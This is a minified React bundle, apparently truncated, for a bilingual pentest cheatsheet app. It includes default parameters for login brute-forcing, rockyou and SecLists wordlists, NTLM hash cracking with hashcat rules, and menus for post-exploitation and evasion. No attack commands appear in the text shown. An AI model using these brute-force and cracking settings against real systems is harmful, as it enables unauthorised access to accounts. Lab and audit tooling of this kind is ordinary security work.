jf={target_ip:"10.10.11.189",target_url:"http://target.htb:8080",wordlist_path:"/usr/share/wordlists/rockyou.txt",wordlist:"/usr/share/wordlists/rockyou.txt",output_file:"nmap_audit.txt",output_txt:"dns_results.txt",delay_time:"1500ms",port:"80,443,8080",udp_ports:"53,161,137",target_domain:"internal.target.htb",dns_wordlist_path:"/usr/share/wordlists/SecLists/subdomains.txt",dns_resolver_ip:"1.1.1.1",extensions:"php,txt,zip",threads_num:"40",threads:"4",agents_wordlist:"/usr/share/wordlists/SecLists/Usernames/UserAgents.txt",exclude_size:"293",username:"root",password:"password123",form_action_path:"/login.php",user_param:"username",pass_param:"password",error_message_pattern:"Invalid credentials",users_list:"/usr/share/wordlists/users.txt",pass_list:"/usr/share/wordlists/rockyou.txt",hashes_file:"ntlm_hashes.txt",rule_file_path:"/usr/share/hashcat/rules/best64.rule"},qf={es:{title:"AUDIT GENERATOR",subtitle:"Biblioteca de Auditorías Técnicas",placeholder:"Buscar herramienta, comando o flag...",generateIA:"Generar con IA",restoreBase:"Restaurar base de herramientas",fasesAuditoria:"Fases de Auditoría",menuReferencias:"Menú de Referencias",catalogoCompleto:"Catálogo completo",favoritos:"Comandos Guardados",reconocimiento:"Reconocimiento",auditoriaWeb:"Auditoría Web",credencialesPass:"Credenciales / Pass",postExplotacion:"Post-Explotación",evasionOpsec:"Evasión / OPSEC",advisorQuote:'"Un pentester no busca flags, busca resolver una situación concreta."',advisorName:"— Senior Lead Pentester",addCommandManual:"Añadir comando manual",cheatsheetLabel:"Cheatsheet:",descargarTxt:"Descargar TXT",exportarCrudo:"Exportar crudo",herramientasCatalogadas:"HERRAMIENTAS CATALOGADAS:",clickAlternar:"Click para alternar referencia",panelParametros:"PANEL DE PARÁMETROS DINÁMICOS",paramInstructions:"Detectamos variables en los comandos de {tool}. Modifica los parámetros a continuación y observa cómo cambian automáticamente los comandos de la página en tiempo real para copiarlos ya listos.",valorPara:"Valor para",noResultados:"Sin resultados en la búsqueda",noResultadosDesc:'No encontramos comandos o flags para "{query}" dentro de la referencia de {tool}.',limpiarFiltros:"Limpiar filtros",invocacionGemini:"Invocación Gemini",dificultad:"DIFICULTAD",frecuencia:"FREC",copiar:"Copiar",copiado:"Copiado!",flagsUtilizados:"FLAGS UTILIZADOS",sinFlags:"No requiere banderas complejas.",ejemploPractico:"Ejemplo práctico de laboratorio (100% Real):",tipOpsec:"TIP OPSEC / TÉCNICO:",usaConResponsabilidad:"Usa con responsabilidad",cheatsheetGenerator:"Cheatsheet Generator",modalIA_title:"Terminal de Generación de Referencias (Gemini)",modalIA_toolNameLabel:"Nombre de la herramienta de seguridad corporativa:",modalIA_customPromptLabel:"Sufijo de prompt adicional / contexto táctico específico (Opcional):",modalIA_generateBtn:"Generar con Gemini AI",modalIA_generatingBtn:"Generando...",modalIA_inputPlaceholder:"ej: responder, metasploit, impacket-psexec, wash, reaver...",modalIA_customPlaceholder:"ej: 'Solo comandos útiles en auditorías activas de Directorio Activo o entornos Windows Server sin DNS local'.",modalManual_title:"Catalogar comando personalizado de Pentest",modalManual_useCaseTitle:"Título del caso de uso:",modalManual_category:"Categoría de Auditoría:",modalManual_difficulty:"Dificultad:",modalManual_frequency:"Frecuencia:",modalManual_command:"Comando estructurado (Usa menor/mayor y variables en angle brackets):",modalManual_flagsUsed:"Parámetros / Flags usados en el comando",modalManual_addFile:"Añadir fila",modalManual_flagPlaceholder:"ej: -u",modalManual_flagDescPlaceholder:"ej: Determina la URL de destino",modalManual_realExample:"Ejemplo 100% Real (Sin placeholders):",modalManual_opsecTip:"Filtro / Consejo OPSEC Práctico:",modalManual_cancel:"Cancelar",modalManual_save:"Guardar comando",basico:"básico",intermedio:"intermedio",avanzado:"avanzado",siempre:"siempre",comun:"común",ocasional:"ocasional",casi_siempre:"casi siempre",switchLang:"Cambiar a Inglés",secSimulated:"Cargar datos simulados (Offline)",exit:"Salir"},en:{title:"AUDIT GENERATOR",subtitle:"Technical Audit Library",placeholder:"Search tool, command or flag...",generateIA:"Generate with AI",restoreBase:"Restore Tool Database",fasesAuditoria:"Audit Phases",menuReferencias:"Reference Menu",catalogoCompleto:"Complete Catalog",favoritos:"Saved Favorites",reconocimiento:"Reconnaissance",auditoriaWeb:"Web Audit",credencialesPass:"Credentials & Pass",postExplotacion:"Post-Exploitation",evasionOpsec:"Evasion / OPSEC",advisorQuote:`"A pentester doesn't look for flags, they look to solve a specific situation."`,advisorName:"— Senior Lead Pentester",addCommandManual:"Add manual command",cheatsheetLabel:"Cheatsheet:",descargarTxt:"Download TXT",exportarCrudo:"Export Raw",herramientasCatalogadas:"CATALOGUED TOOLS:",clickAlternar:"Click to toggle reference",panelParametros:"DYNAMIC PARAMETERS PANEL",paramInstructions:"We detected variables in {tool}'s commands. Modify the parameters below and see how the commands adapt in real-time.",valorPara:"Value for",noResultados:"No results found",noResultadosDesc:`No commands or flags match "{query}" inside {tool}'s reference.`,limpiarFiltros:"Clear filters",invocacionGemini:"Gemini Invocation",dificultad:"DIFFICULTY",frecuencia:"FREQ",copiar:"Copy",copiado:"Copied!",flagsUtilizados:"FLAGS USED",sinFlags:"Does not require complex flags.",ejemploPractico:"Practical lab example (100% Real):",tipOpsec:"OPSEC / TECHNICAL TIP:",usaConResponsabilidad:"Use responsibly",cheatsheetGenerator:"Cheatsheet Generator",modalIA_title:"Reference Generation Terminal (Gemini)",modalIA_toolNameLabel:"Corporate security tool name:",modalIA_customPromptLabel:"Additional prompt suffix / specific tactical context (Optional):",modalIA_generateBtn:"Generate with Gemini AI",modalIA_generatingBtn:"Generating...",modalIA_inputPlaceholder:"e.g., responder, metasploit, impacket-psexec, wash, reaver...",modalIA_customPlaceholder:"e.g., 'Only useful commands in active Active Directory audits or Windows Server environments without local DNS'.",modalManual_title:"Catalog custom Pentest command",modalManual_useCaseTitle:"Use Case Title:",modalManual_category:"Audit Category:",modalManual_difficulty:"Difficulty:",modalManual_frequency:"Frequency:",modalManual_command:"Structured command (Use angle brackets for variables):",modalManual_flagsUsed:"Parameters / Flags used in the command",modalManual_addFile:"Add row",modalManual_flagPlaceholder:"e.g., -u",modalManual_flagDescPlaceholder:"e.g., Specifies the target URL",modalManual_realExample:"100% Real Example (No placeholders):",modalManual_opsecTip:"Practical OPSEC / Tip advice:",modalManual_cancel:"Cancel",modalManual_save:"Save command",basico:"basic",intermedio:"intermediate",avanzado:"advanced",siempre:"always",comun:"common",ocasional:"occasional",casi_siempre:"almost always",switchLang:"Switch to Spanish",secSimulated:"Load simulated data (Offline)",exit:"Exit"}};function Kh(){const[T,F]=ye.useState(()=>{const m=localStorage.getItem("cyber_cheatsheet_lang");return m==="es"||m==="en"?m:"es"});ye.useEffect(()=>{localStorage.setItem("cyber_cheatsheet_lang",T)},[T]);const[M,p]=ye.useState(()=>{if(localStorage.getItem("cyber_cheatsheet_version")!=="4.4")return localStorage.setItem("cyber_cheatsheet_version","4.4"),localStorage.removeItem("cyber_tools_cheatsheets"),Fa;const _=localStorage.getItem("cyber_tools_cheatsheets");if(_)try{const X=JSON.parse(_),ne={};return Object.keys(Fa).forEach(H=>{X[H]?ne[H]={...X[H],name:Fa[H].name,description:Fa[H].description,descriptionEn:Fa[H].descriptionEn,category:Fa[H].category}:ne[H]=Fa[H]}),ne}catch{return Fa}return Fa}),x=m=>qf[T][m]||qf.es[m]||"";ye.useEffect(()=>{localStorage.setItem("cyber_tools_cheatsheets",JSON.stringify(M))},[M]);const[B,W]=ye.useState(()=>{try{const m=localStorage.getItem("cyber_commands_favorites");return m?JSON.parse(m):[]}catch{return[]}});ye.useEffect(()=>{localStorage.setItem("cyber_commands_favorites",JSON.stringify(B))},[B]);const de=(m,G)=>{const _=`${m}::${G}`;W(X=>X.includes(_)?X.filter(ne=>ne!==_):[...X,_])},[D,O]=ye.useState("nmap"),w=M[D]||Fa.nmap,[I,fe]=ye.useState("Todos"),Le=m=>{if(fe(m),m!=="Todos"&&m!=="Favoritos"&&w.category!==m){const G=Object.keys(M).find(_=>M[_].category===m);G&&O(G)}},Oe=m=>{O(m);const G=M[m];G&&I!=="Todos"&&G.category!==I&&fe("Todos")},[me,Ke]=ye.useState(""),[Y,$e]=ye.useState(()=>({...jf})),[qe,ra]=ye.useState(!1),[ya,we]=ye.useState(!1),[K,He]=ye.useState(""),[ca,ct]=ye.useState("básico"),[ua,Qe]=ye.useState("siempre"),[Ta,Ea]=ye.useState(""),[ea,y]=ye.useState(""),[N,q]=ye.useState(""),[ie,oe]=ye.useState([{flag:"",desc:""}]),[d,S]=ye.useState({}),L=T==="en"&&w.rawTextEn?w.rawTextEn:w.rawText,R=w?ts(L).map(m=>({...m,categoria:w.category})):[],V=(()=>{if(I==="Favoritos"){const m=[];return Object.entries(M).forEach(([G,_])=>{const X=T==="en"&&_.rawTextEn?_.rawTextEn:_.rawText;ts(X).map(H=>({...H,categoria:_.category,toolName:_.name,toolKey:G,isFavorite:!0})).forEach(H=>{const ze=`${_.name}::${H.titulo}`;B.includes(ze)&&m.push(H)})}),m}else return R.map(m=>{const G=`${w.name}::${m.titulo}`;return{...m,toolName:w.name,toolKey:D,isFavorite:B.includes(G)}})})(),se=V.filter(m=>{const G=I==="Favoritos"||I==="Todos"||m.categoria.toLowerCase()===I.toLowerCase(),_=me.toLowerCase().trim();if(!_)return G;const X=m.toolName.toLowerCase().includes(_),ne=m.titulo.toLowerCase().includes(_),H=m.comando.toLowerCase().includes(_),ze=m.tip.toLowerCase().includes(_),Ba=m.flags.some(ka=>ka.flag.toLowerCase().includes(_)||ka.descripcion.toLowerCase().includes(_));return G&&(X||ne||H||ze||Ba)}),Ce=(()=>{const m=new Set;return V.forEach(G=>{const _=G.comando.match(/<([^>]+)>/g);_&&_.forEach(X=>m.add(X.slice(1,-1)))}),Array.from(m)})(),wt=(m,G)=>{$e(_=>({..._,[m]:G}))},el=(m,G)=>{let _=m;const X=m.match(/<([^>]+)>/g);X&&X.forEach(ne=>{const H=ne.slice(1,-1),ze=Y[H]!==void 0?Y[H]:ne;_=_.replaceAll(ne,ze)}),navigator.clipboard.writeText(_).then(()=>{S(ne=>({...ne,[G]:!0})),setTimeout(()=>{S(ne=>({...ne,[G]:!1}))},1500)})},jl=(m,G)=>{const _=T==="es"?`¿Seguro que deseas eliminar el caso "${G}" de la referencia técnica de ${m}?`:`Are you sure you want to delete "${G}" from ${m}'s reference?`;if(!window.confirm(_))return;const X=Object.keys(M).find(Ma=>M[Ma].name.toLowerCase()===m.toLowerCase());if(!X)return;const ne=M[X],H=T==="en"&&ne.rawTextEn?ne.rawTextEn:ne.rawText,Ba=ts(H).filter(Ma=>Ma.titulo!==G),ka=Gf(Ba);p(Ma=>({...Ma,[X]:{...Ma[X],rawText:ka}}))},zi=()=>{w&&navigator.clipboard.writeText(w.rawText).then(()=>{alert("¡Cheatsheet completa copiada al portapapeles con formato original!")})},Pa=()=>{window.confirm("Se restaurarán todas las herramientas predeterminadas y se descartarán los cambios personalizados. ¿Continuar?")&&(p(Fa),O("nmap"),$e({...jf}),localStorage.removeItem("cyber_tools_cheatsheets"))},ql=m=>{if(m.preventDefault(),!K||!Ta){alert("Es obligatorio definir el título y el comando.");return}const G=ie.filter(H=>H.flag.trim()!=="").map(H=>`${H.flag.trim()} → ${H.desc.trim()||"Explicación del parámetro."}`),_={titulo:K.trim(),categoria:w.category,dificultad:ca,frecuencia:ua,comando:Ta.trim(),flags:G.map(H=>{const ze=H.split(" → ");return{flag:ze[0],descripcion:ze[1]}}),ejemplo:ea.trim()||Ta.trim(),tip:N.trim()||"Sin consejos OPSEC."},X=ts(w.rawText);X.push(_);const ne=Gf(X);p(H=>({...H,[D]:{...H[D],rawText:ne}})),He(""),Ea(""),y(""),q(""),oe([{flag:"",desc:""}]),we(!1),alert("¡Caso de uso catalogado con éxito!")},Hl=()=>{oe(m=>[...m,{flag:"",desc:""}])},Fi=(m,G,_)=>{const X=[...ie];X[m][G]=_,oe(X)},Gi=()=>{if(!w)return;const m=new Blob([w.rawText],{type:"text/plain;charset=utf-8"}),G=URL.createObjectURL(m),_=document.createElement("a");_.href=G,_.download=`${w.name.toLowerCase()}_cheatsheet.txt`,document.body.appendChild(_),_.click(),document.body.removeChild(_)};return u.jsxs("div",{className:"min-h-screen bg-[#020617] text-slate-300 flex flex-col font-sans transition-all duration-300 antialiased",children:[u.jsxs("header",{className:"bg-slate-900 border-b border-slate-800 px-6 h-16 flex justify-between items-center fixed top-0 w-full z-30 shadow-md",children:[u.jsxs("div",{className:"flex items-center gap-3",children:[u.jsx("div",{className:"w-8 h-8 rounded bg-emerald-600 flex items-center justify-center shadow-md",children:u.jsx(Or,{className:"w-4 h-4 text-white"})}),u.jsxs("div",{className:"flex flex-col",children:[u.jsxs("h1",{className:"text-sm font-extrabold text-white tracking-tight flex items-center gap-1.5",children:[x("title")," ",u.jsx("span",{className:"text-emerald-400 font-mono text-[10px] bg-slate-950 border border-slate-850 px-1 py-0.5 rounded",children:"v4.4"})]}),u.jsx("p",{className:"text-[9px] text-slate-400 uppercase tracking-widest font-semibold leading-none mt-1",children:x("subtitle")})]})]}),u.jsxs("div",{className:"flex-1 max-w-xl mx-8 relative group hidden sm:block",children:[u.jsx("span",{className:"font-mono font-bold absolute left-3 top-1/2 -translate-y-1/2 text-emerald-500 mt-[-1px] text-sm",children:">"}),u.jsx("input",{type:"text",value:me,onChange:m=>Ke(m.target.value),className:"w-full bg-slate-950 border border-slate-800 focus:border-emerald-500 focus:ring-0 rounded text-sm font-mono text-slate-200 pl-7 pr-8 py-2 transition-all group-hover:border-slate-700 placeholder-slate-650 focus:outline-hidden",placeholder:x("placeholder")}),me&&u.jsx("button",{onClick:()=>Ke(""),className:"absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white transition-colors cursor-pointer",children:u.jsx(Ff,{className:"w-4 h-4"})})]}),u.jsxs("div",{className:"flex items-center gap-3",children:[u.jsxs("div",{className:"flex items-center bg-slate-925 border border-slate-800 rounded-md p-0.5 font-mono text-[10px] font-bold",children:[u.jsx("button",{type:"button",onClick:()=>F("es"),className:`px-2 py-0.5 rounded-xs transition-all cursor-pointer ${T==="es"?"bg-emerald-600 text-white font-extrabold":"text-slate-500 hover:text-slate-350"}`,title:"Cambiar a Español",children:"ES"}),u.jsx("button",{type:"button",onClick:()=>F("en"),className:`px-2 py-0.5 rounded-xs transition-all cursor-pointer ${T==="en"?"bg-emerald-600 text-white font-extrabold":"text-slate-500 hover:text-slate-350"}`,title:"Switch to English",children:"EN"})]}),u.jsx("button",{type:"button",onClick:Pa,title:x("restoreBase"),className:"p-2 border border-slate-800 hover:border-red-500/50 hover:bg-red-500/10 text-slate-400 hover:text-red-400 rounded-md transition-colors cursor-pointer",children:u.jsx(jh,{className:"w-4 h-4"})})]})]}),u.jsxs("div",{className:"flex-1 pt-16 flex relative",children:[u.jsxs("aside",{className:"w-[280px] bg-slate-900/35 border-r border-slate-800 fixed left-0 top-16 bottom-12 overflow-y-auto hidden md:flex flex-col select-none z-20",children:[u.jsxs("div",{className:"p-4 border-b border-slate-850",children:[u.jsx("span",{className:"font-sans text-[11px] font-bold text-slate-400 uppercase tracking-wider block mb-1",children:x("fasesAuditoria")}),u.jsxs("div",{className:"flex items-center gap-2",children:[u.jsx(Oh,{className:"w-4 h-4 text-emerald-400"}),u.jsx("span",{className:"font-sans text-xs font-bold text-slate-200 uppercase tracking-tight",children:x("menuReferencias")})]})]}),u.jsx("nav",{className:"flex-1 py-4 flex flex-col gap-1 px-2",children:[{id:"Todos",label:x("catalogoCompleto"),count:Object.keys(M).length,icon:zh},{id:"Favoritos",label:x("favoritos"),count:B.length,icon:Sr},{id:"Reconocimiento",label:x("reconocimiento"),count:Object.values(M).filter(m=>m.category==="Reconocimiento").length,icon:Hh},{id:"Web",label:x("auditoriaWeb"),count:Object.values(M).filter(m=>m.category==="Web").length,icon:Dh},{id:"Passwords",label:x("credencialesPass"),count:Object.values(M).filter(m=>m.category==="Passwords").length,icon:Rh},{id:"Post-explotación",label:x("postExplotacion"),count:Object.values(M).filter(m=>m.category==="Post-explotación").length,icon:Or},{id:"Evasión",label:x("evasionOpsec"),count:Object.values(M).filter(m=>m.category==="Evasión").length,icon:Cr}].map(m=>{const G=m.icon,_=I===m.id;return u.jsxs("button",{onClick:()=>Le(m.id),className:`w-full flex items-center justify-between px-3 py-2 rounded text-xs font-mono transition-all text-left cursor-pointer ${_?"bg-slate-800 text-white border-l-2 border-emerald-500 font-bold shadow-xs":"text-slate-400 hover:text-slate-200 hover:bg-slate-800/50"}`,children:[u.jsxs("div",{className:"flex items-center gap-2.5",children:[u.jsx(G,{className:`w-3.5 h-3.5 ${_?"text-emerald-400":m.id==="Favoritos"?"text-amber-500/70":"text-slate-650"}`}),u.jsx("span",{children:m.label})]}),u.jsx("span",{className:`px-1.5 py-0.5 rounded text-[10px] ${_?"bg-emerald-500/10 text-emerald-400 border border-emerald-500/20":m.id==="Favoritos"?"bg-amber-500/10 text-amber-400 border border-amber-500/20":"bg-slate-950/80 text-slate-500"}`,children:m.count})]},m.id)})}),u.jsxs("div",{className:"p-4 border-t border-slate-850 flex flex-col gap-3",children:[u.jsxs("div",{className:"p-3 bg-slate-950/90 rounded-lg border border-slate-850 text-[11px]",children:[u.jsx("p",{className:"text-slate-500 mb-1.5 italic",children:x("advisorQuote")}),u.jsx("p",{className:"text-emerald-500 font-bold",children:x("advisorName")})]}),u.jsxs("button",{onClick:()=>we(!0),className:"w-full py-2 border border-dashed border-slate-800 hover:border-emerald-500/50 hover:bg-slate-850/50 text-slate-300 hover:text-emerald-400 text-xs font-mono font-bold tracking-tight rounded transition-all flex items-center justify-center gap-1.5 cursor-pointer",children:[u.jsx(Er,{className:"w-3.5 h-3.5"}),u.jsx("span",{children:x("addCommandManual")})]})]})]}),u.jsxs("div",{className:"flex-1 md:ml-[280px] p-6 pb-24 flex flex-col",children:[u.jsx("div",{className:"flex md:hidden gap-2 overflow-x-auto pb-3 mb-4 scrollbar-thin",children:["Todos","Favoritos","Reconocimiento","Web","Passwords","Post-explotación","Evasión"].map(m=>{let G=m;return m==="Todos"?G=x("catalogoCompleto"):m==="Favoritos"?G=x("favoritos"):m==="Reconocimiento"?G=x("reconocimiento"):m==="Web"?G=x("auditoriaWeb"):m==="Passwords"?G=x("credencialesPass"):m==="Post-explotación"?G=x("postExplotacion"):m==="Evasión"&&(G=x("evasionOpsec")),u.jsx("button",{onClick:()=>Le(m),className:`px-3 py-1.5 text-xs font-mono rounded whitespace-nowrap transition-all border cursor-pointer ${I===m?"bg-emerald-500/10 text-emerald-400 border-emerald-500 font-bold":"bg-slate-950 text-slate-400 border-slate-800"}`,children:G},m)})}),u.jsxs("div",{className:"flex flex-col gap-4 mb-6",children:[u.jsx("span",{className:"font-mono text-[10px] font-bold text-emerald-400 tracking-widest uppercase",children:T==="es"?"[ AUDITORÍA DE SEGURIDAD INTERACTIVA ]":"[ INTERACTIVE SECURITY AUDIT ]"}),u.jsxs("div",{className:"flex flex-wrap lg:flex-nowrap justify-between gap-4 items-start",children:[u.jsxs("div",{children:[u.jsxs("h1",{className:"text-2xl md:text-3xl font-extrabold font-sans text-white tracking-tight flex items-center gap-2",children:[u.jsx("span",{children:x("cheatsheetLabel")}),u.jsx("span",{className:"text-emerald-400",children:w.name})]}),u.jsx("p",{className:"text-slate-400 text-sm mt-1 max-w-2xl",children:T==="en"&&w.descriptionEn?w.descriptionEn:w.description})]}),u.jsxs("div",{className:"flex items-center gap-2 shrink-0",children:[u.jsxs("button",{onClick:Gi,className:"flex items-center gap-1.5 px-3 py-1.5 border border-slate-800 hover:border-slate-650 hover:bg-slate-800/30 text-slate-400 hover:text-white text-xs font-mono rounded transition-all cursor-pointer",title:T==="es"?"Descargar esta referencia técnica en un archivo txt":"Download this technical reference into a txt file",children:[u.jsx(Uh,{className:"w-3.5 h-3.5"}),u.jsx("span",{children:x("descargarTxt")})]}),u.jsxs("button",{onClick:zi,className:"flex items-center gap-1.5 px-3 py-1.5 border border-emerald-500/20 hover:border-emerald-500 bg-emerald-500/5 hover:bg-emerald-500/10 text-emerald-400 text-xs font-mono rounded transition-all cursor-pointer",title:T==="es"?"Copiar contenido crudo en formato formal de parsing":"Copy raw content in official parsing format",children:[u.jsx(zf,{className:"w-3.5 h-3.5"}),u.jsx("span",{children:x("exportarCrudo")})]})]})]})]}),u.jsxs("div",{className:"bg-slate-900/60 border border-slate-800 rounded-lg p-4 mb-6 flex flex-col gap-3 glow-border backdrop-blur-xs",children:[u.jsxs("div",{className:"flex items-center justify-between",children:[u.jsx("span",{className:"font-mono text-xs font-bold text-slate-400 tracking-wider uppercase",children:x("herramientasCatalogadas")}),u.jsx("span",{className:"font-mono text-[11px] text-emerald-500/80 font-bold uppercase",children:x("clickAlternar")})]}),u.jsx("div",{className:"flex flex-wrap gap-2",children:Object.values(M).filter(m=>I==="Todos"||m.category===I).map(m=>{const G=m.name.toLowerCase()===w.name.toLowerCase();let _="hover:border-slate-600",X="border-emerald-500 text-emerald-400 bg-emerald-500/10";return m.category==="Web"?X="border-blue-500/40 text-blue-400 bg-blue-500/10":m.category==="Passwords"?X="border-amber-500/40 text-amber-400 bg-amber-500/10":m.category==="Post-explotación"?X="border-purple-500/40 text-purple-400 bg-purple-500/10":m.category==="Evasión"&&(X="border-red-500/40 text-red-500 bg-red-400/10"),u.jsx("button",{onClick:()=>{const ne=Object.entries(M).find(([H,ze])=>ze.name===m.name);Oe(ne?ne[0]:m.name.toLowerCase().replace(/[^a-z0-9_-]/g,""))},className:`px-3 py-1.5 text-xs font-mono rounded border transition-all cursor-pointer ${G?`${X} font-bold shadow-xs`:`bg-slate-950 text-slate-400 border-slate-850 ${_}`}`,children:m.name},m.name)})})]}),Ce.length>0&&u.jsxs("div",{className:"bg-slate-900/50 border border-slate-800 rounded-lg p-5 mb-6 shadow-sm",children:[u.jsxs("div",{className:"flex items-center gap-2 mb-3",children:[u.jsx(Cr,{className:"w-4 h-4 text-emerald-400"}),u.jsx("h3",{className:"font-mono text-xs font-bold tracking-wider text-white uppercase",children:x("panelParametros")})]}),u.jsx("p",{className:"text-xs text-slate-400 mb-4 font-medium",children:x("paramInstructions").replace("{tool}",w.name)}),u.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-x-4 gap-y-3",children:Ce.map(m=>u.jsxs("div",{className:"flex flex-col gap-1",children:[u.jsxs("label",{className:"font-mono text-[11px] text-slate-400 block font-semibold",children:["<",m,">"]}),u.jsx("input",{type:"text",className:"bg-slate-950 border border-slate-850 focus:border-emerald-500 focus:ring-0 rounded px-2.5 py-1.5 text-xs font-mono text-slate-100 transition-all placeholder-slate-705 focus:shadow-[0_0_8px_rgba(16,185,129,0.08)]",value:Y[m]!==void 0?Y[m]:"",onChange:G=>wt(m,G.target.value),placeholder:`${x("valorPara")} ${m}...`})]},m))})]}),u.jsx("div",{className:"flex flex-col gap-6",children:se.length===0?u.jsx("div",{className:"bg-slate-900/40 border border-dashed border-slate-800 p-12 rounded-lg text-center flex flex-col items-center justify-center opacity-95",children:I==="Favoritos"?u.jsxs(u.Fragment,{children:[u.jsx(Sr,{className:"w-12 h-12 text-amber-500/60 mb-3 animate-pulse"}),u.jsx("h3",{className:"font-mono text-sm font-bold text-slate-200 mb-1",children:T==="es"?"No tienes comandos guardados":"No bookmarked commands yet"}),u.jsx("p",{className:"text-xs text-slate-400 max-w-sm mb-4 leading-relaxed",children:T==="es"?"Haz clic en el ícono de estrella de cualquier comando para registrarlo en tu handbook de pentest personalizado y tener acceso directo.":"Click the star icon on any command to save it into your personal pentesting handbook for split-second retrieval."})]}):u.jsxs(u.Fragment,{children:[u.jsx(Or,{className:"w-12 h-12 text-slate-500 mb-3"}),u.jsx("h3",{className:"font-mono text-sm font-bold text-slate-200 mb-1",children:x("noResultados")}),u.jsx("p",{className:"text-xs text-slate-400 max-w-md mb-4 leading-relaxed",children:x("noResultadosDesc").replace("{query}",me).replace("{tool}",w.name)}),u.jsx("div",{className:"flex gap-2",children:u.jsx("button",{onClick:()=>Ke(""),className:"px-3 py-1.5 bg-slate-950 border border-slate-800 hover:border-slate-700 text-slate-300 font-mono text-xs rounded transition-all cursor-pointer",children:x("limpiarFiltros")})})]})}):se.map((m,G)=>{const _=`${m.toolName}::${m.titulo}`;let X="text-emerald-400 border-emerald-550/25 bg-emerald-500/10";m.categoria.toLowerCase()==="web"?X="text-blue-400 border-blue-500/20 bg-blue-500/10":m.categoria.toLowerCase()==="passwords"?X="text-amber-400 border-amber-500/20 bg-amber-500/10":m.categoria.toLowerCase()==="post-explotación"?X="text-purple-400 border-purple-500/20 bg-purple-500/10":m.categoria.toLowerCase()==="evasión"&&(X="text-red-400 border-red-500/20 bg-red-400/10");let ne=m.categoria;T==="en"&&(m.categoria.toLowerCase()==="reconocimiento"?ne="Reconnaissance":m.categoria.toLowerCase()==="web"?ne="Web Audit":m.categoria.toLowerCase()==="passwords"?ne="Credentials":m.categoria.toLowerCase()==="post-explotación"?ne="Post-Exploitation":m.categoria.toLowerCase()==="evasión"&&(ne="Evasion / OPSEC"));let H=m.dificultad;T==="en"&&(m.dificultad.toLowerCase()==="básico"?H="basic":m.dificultad.toLowerCase()==="intermedio"?H="intermediate":m.dificultad.toLowerCase()==="avanzado"&&(H="advanced"));let ze=m.frecuencia;return T==="en"&&(m.frecuencia.toLowerCase()==="siempre"?ze="always":m.frecuencia.toLowerCase()==="común"?ze="common":m.frecuencia.toLowerCase()==="ocasional"?ze="occasional":m.frecuencia.toLowerCase()==="casi siempre"&&(ze="almost always")),u.jsxs("div",{className:"bg-slate-900/60 border border-slate-800 rounded-lg p-5 flex flex-col gap-4 hover:border-slate-700 transition-all relative group glow-border",children:[u.jsxs("div",{className:"flex flex-wrap sm:flex-nowrap justify-between items-start gap-2",children:[u.jsxs("div",{children:[u.jsxs("h2",{className:"text-base font-extrabold text-white tracking-tight flex items-center gap-2",children:[u.jsxs("span",{className:"font-mono text-emerald-500/40 text-xs",children:["#",G+1]}),u.jsx("span",{children:m.titulo})]}),u.jsxs("div",{className:"flex flex-wrap gap-2 mt-2",children:[u.jsx("span",{className:`px-2 py-0.5 border text-[10px] font-mono tracking-wider rounded uppercase font-semibold ${X}`,children:ne}),u.jsxs("span",{className:"px-2 py-0.5 border border-slate-800 text-slate-400 text-[10px] font-mono rounded uppercase bg-slate-950/75 font-semibold",children:[x("dificultad"),": ",H.toUpperCase()]}),u.jsxs("span",{className:"px-2 py-0.5 border border-slate-800 text-slate-400 text-[10px] font-mono rounded uppercase bg-slate-950/75 font-semibold",children:[x("frecuencia"),": ",ze.toUpperCase()]})]})]}),u.jsxs("div",{className:"flex items-center gap-1.5 self-start",children:[I==="Favoritos"&&u.jsx("span",{className:"px-2 py-0.5 rounded text-[9px] uppercase tracking-wider font-extrabold font-mono bg-cyan-500/10 border border-cyan-500/20 text-cyan-400",children:m.toolName}),u.jsx("button",{onClick:()=>de(m.toolName,m.titulo),className:`p-1.5 rounded border transition-all cursor-pointer ${m.isFavorite?"text-amber-400 hover:text-amber-300 bg-amber-400/10 border-amber-500/20":"text-slate-500 hover:text-amber-400 hover:bg-amber-450/5 border-transparent hover:border-amber-500/10"}`,title:T==="es"?m.isFavorite?"Quitar de favoritos":"Guardar en favoritos":m.isFavorite?"Remove from bookmarks":"Add to bookmarks",children:u.jsx(Sr,{className:`w-3.5 h-3.5 ${m.isFavorite?"fill-amber-400":""}`})}),u.jsx("button",{onClick:()=>jl(m.toolName,m.titulo),className:"text-slate-650 hover:text-red-400 p-1.5 hover:bg-red-500/10 hover:border-red-500/10 rounded border border-transparent transition-colors cursor-pointer transition-all",title:T==="es"?"Eliminar este caso de uso":"Delete this usecase",children:u.jsx(Yh,{className:"w-3.5 h-3.5"})})]})]}),u.jsx("div",{className:"relative",children:u.jsxs("div",{className:"bg-slate-950 border border-slate-800/80 rounded p-4 font-mono text-xs overflow-x-auto flex justify-between items-center group/btn gap-3 shadow-inner",children:[u.jsxs("div",{className:"flex items-start gap-2 flex-1",children:[u.jsx("span",{className:"select-none text-emerald-500/50 mr-2 font-bold",children:"$"}),u.jsx("code",{className:"text-emerald-400 select-all flex-1",children:u.jsx(Vh,{commandTemplate:m.comando,replacements:Y})})]}),u.jsxs("button",{onClick:()=>el(m.comando,_),className:"px-3.5 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white font-mono text-[10px] font-bold rounded transition-all shrink-0 uppercase flex items-center gap-1.5 cursor-pointer shadow-sm",children:[d[_]?u.jsx(Nh,{className:"w-3 h-3 text-white"}):u.jsx(zf,{className:"w-3.5 h-3.5"}),u.jsx("span",{children:d[_]?x("copiado"):x("copiar")})]})]})}),u.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-5 mt-1",children:[u.jsxs("div",{children:[u.jsxs("div",{className:"font-mono text-[10px] font-bold text-slate-400 tracking-wider uppercase border-b border-slate-800 pb-1.5 mb-2.5 flex items-center gap-1",children:[u.jsx(Cr,{className:"w-3 h-3 text-emerald-400"}),u.jsx("span",{children:x("flagsUtilizados")})]}),m.flags.length===0?u.jsx("p",{className:"text-xs text-slate-600 italic",children:x("sinFlags")}):u.jsx("div",{className:"flex flex-col gap-2",children:m.flags.map((Ba,ka)=>u.jsxs("div",{className:"grid grid-cols-[100px_1fr] md:grid-cols-[120px_1fr] gap-2 items-start group/flag border-b border-slate-850/40 pb-1.5 text-xs",children:[u.jsx("span",{className:"font-mono font-bold text-emerald-400 group-hover/flag:text-emerald-300 select-all shrink-0",children:Ba.flag}),u.jsx("span",{className:"text-slate-300 leading-relaxed 